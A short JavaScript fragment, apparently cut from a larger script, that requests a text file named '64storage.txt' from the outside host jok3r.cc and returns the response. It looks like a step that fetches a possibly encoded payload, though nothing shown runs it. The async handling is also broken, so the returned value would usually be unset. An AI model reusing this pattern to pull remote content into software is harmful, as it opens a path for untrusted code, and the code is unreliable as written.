		$.AsyncWebRequest('https://jok3r.cc/64storage.txt', {type: 'GET', complete: function(sigma) {
			response = sigma.responseText;
		}});
		return response;
		